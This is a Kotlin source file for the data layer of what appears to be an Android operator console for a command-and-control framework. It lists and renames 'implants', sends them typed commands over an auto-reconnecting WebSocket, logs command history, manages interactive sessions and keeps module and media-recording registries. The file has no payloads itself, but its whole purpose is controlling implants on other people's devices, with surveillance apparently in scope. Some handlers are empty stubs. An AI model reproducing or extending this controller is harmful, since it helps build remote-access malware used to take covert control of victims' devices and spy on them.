package com.shadow.operator.data

import kotlinx.coroutines.*
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.flow.*
import kotlinx.serialization.json.*
import kotlinx.serialization.encodeToString
import io.ktor.client.plugins.websocket.webSocket
import io.ktor.websocket.close
import io.ktor.websocket.readText
import java.util.concurrent.ConcurrentHashMap

class Repository(
    private val dao: ImplantDao,
    private val historyDao: CommandHistoryDao,
    private val moduleDao: ModuleRegistryDao,
    private val mediaDao: MediaRecordingDao,
    private val configManager: ConfigManager,
    private val scope: CoroutineScope
) {
    private val pendingCommands = ConcurrentHashMap<String, CompletableDeferred<String>>()
    private val activeSessions = ConcurrentHashMap<String, SessionState>()

    val allImplants: MutableStateFlow<List<ImplantEntity>> = MutableStateFlow(emptyList())
    val onlineImplants: MutableStateFlow<List<ImplantEntity>> = MutableStateFlow(emptyList())
    val commandHistory: MutableStateFlow<List<CommandHistoryEntity>> = MutableStateFlow(emptyList())
    val moduleRegistry: MutableStateFlow<List<ModuleRegistryEntity>> = MutableStateFlow(emptyList())
    val connectionState: MutableStateFlow<ConnectionState> = MutableStateFlow(ConnectionState.DISCONNECTED)
    val currentLatency: MutableStateFlow<Long> = MutableStateFlow(-1)

    private var networkManager: NetworkManager? = null
    private var websocketJob: Job? = null

    init {
        observeDatabase()
    }

    private fun observeDatabase() {
        scope.launch { dao.getAll().collect { allImplants.value = it } }
        scope.launch { dao.getOnline().collect { onlineImplants.value = it } }
        scope.launch { moduleDao.getAll().collect { moduleRegistry.value = it } }
    }

    fun initializeNetwork(config: ClientConfig) {
        networkManager = NetworkManager(this, config)
        websocketJob = scope.launch { networkManager!!.connect() }
    }

    fun shutdown() {
        websocketJob?.cancel()
        scope.launch { networkManager?.disconnect() }
    }

    // --- High-level Operations ---

    suspend fun addOrUpdateImplant(implant: ImplantEntity) {
        dao.insert(implant)
    }

    suspend fun removeImplant(implantId: String) {
        dao.delete(implantId)
        historyDao.cleanupOld(System.currentTimeMillis() - 30_000_000_000L)
    }

    suspend fun renameImplant(implantId: String, nickname: String?) {
        val implant = dao.getById(implantId) ?: return
        dao.insert(implant.copy(nickname = nickname))
    }

    // --- Command Execution ---

    fun sendCommand(
        implantId: String,
        type: Command.CommandType,
        payload: String,
        sessionId: String? = null
    ): Deferred<String> {
        val command = Command(implantId = implantId, type = type, payload = payload)
        val completer = CompletableDeferred<String>()
        pendingCommands[command.id] = completer

        val frame = Frame(
            id = command.id,
            cmd = type.value,
            payload = payload,
            sessionId = sessionId
        )

        scope.launch { networkManager?.send(frame) }

        scope.launch {
            historyDao.insert(CommandHistoryEntity(
                implantId = implantId,
                commandType = type.value,
                commandPayload = payload,
                status = "SENT"
            ))
        }

        return completer
    }

    fun handleIncomingFrame(frame: Frame) {
        when {
            frame.cmd == "result" || frame.cmd == "error" -> {
                pendingCommands.remove(frame.id)?.complete(frame.payload)
                scope.launch {
                    historyDao.updateStatus(
                        id = frame.id.toLongOrNull() ?: 0,
                        status = if (frame.cmd == "result") "COMPLETED" else "FAILED",
                        response = frame.payload,
                        duration = System.currentTimeMillis() - frame.ts
                    )
                }
            }
            frame.cmd == "heartbeat" -> {
                currentLatency.value = System.currentTimeMillis() - frame.ts
            }
            frame.cmd == "implant_status" -> {
                scope.launch { handleImplantStatus(frame.payload) }
            }
            frame.cmd == "module_list" -> {
                scope.launch { handleModuleList(frame.payload) }
            }
            else -> {
                activeSessions[frame.sessionId ?: "default"]?.channel?.trySend(frame)
            }
        }
    }

    private suspend fun handleImplantStatus(payload: String) {
        // Parse and update implant status
    }

    private suspend fun handleModuleList(payload: String) {
        // Update module registry
    }

    // --- Session Management ---

    fun createSession(implantId: String, type: String): SessionState {
        val session = SessionState(implantId, type)
        activeSessions["${implantId}_$type"] = session
        return session
    }

    fun closeSession(implantId: String, type: String) {
        activeSessions.remove("${implantId}_$type")?.channel?.close()
    }
}

enum class ConnectionState { DISCONNECTED, CONNECTING, CONNECTED, RECONNECTING, ERROR }

data class SessionState(
    val implantId: String,
    val type: String,
    val channel: Channel<Frame> = Channel(100),
    val createdAt: Long = System.currentTimeMillis()
)

class NetworkManager(
    private val repository: Repository,
    private val config: ClientConfig
) {
    private val client = io.ktor.client.HttpClient(io.ktor.client.engine.android.Android) {
        install(io.ktor.client.plugins.websocket.WebSockets)
    }
    private var webSocketSession: io.ktor.websocket.WebSocketSession? = null
    private var reconnectAttempts = 0
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    suspend fun connect() {
        repository.connectionState.value = ConnectionState.CONNECTING

        try {
            client.webSocket(config.workerUrl) {
                webSocketSession = this
                repository.connectionState.value = ConnectionState.CONNECTED
                reconnectAttempts = 0

                // Incoming messages
                for (frame in incoming) {
                    val textFrame = frame as? io.ktor.websocket.Frame.Text
                    if (textFrame != null) {
                        val json = textFrame.readText()
                        val frameObj = Json.decodeFromString<Frame>(json)
                        repository.handleIncomingFrame(frameObj)
                    }
                }
            }
        } catch (e: Exception) {
            repository.connectionState.value = ConnectionState.ERROR
        }

        // Connection closed - handle reconnect
        if (config.autoReconnect &&
            (config.maxReconnectAttempts == -1 || reconnectAttempts < config.maxReconnectAttempts)
        ) {
            reconnectAttempts++
            repository.connectionState.value = ConnectionState.RECONNECTING
            delay(config.reconnectIntervalSec * 1000L)
            connect()
        } else {
            repository.connectionState.value = ConnectionState.DISCONNECTED
        }
    }

    suspend fun disconnect() {
        webSocketSession?.let { session ->
            session.close(io.ktor.websocket.CloseReason(io.ktor.websocket.CloseReason.Codes.NORMAL, "Client disconnect"))
        }
        webSocketSession = null
        client.close()
    }

    suspend fun send(frame: Frame) {
        val session = webSocketSession ?: return
        val json = Json.encodeToString(frame)
        session.send(io.ktor.websocket.Frame.Text(json))
    }
}
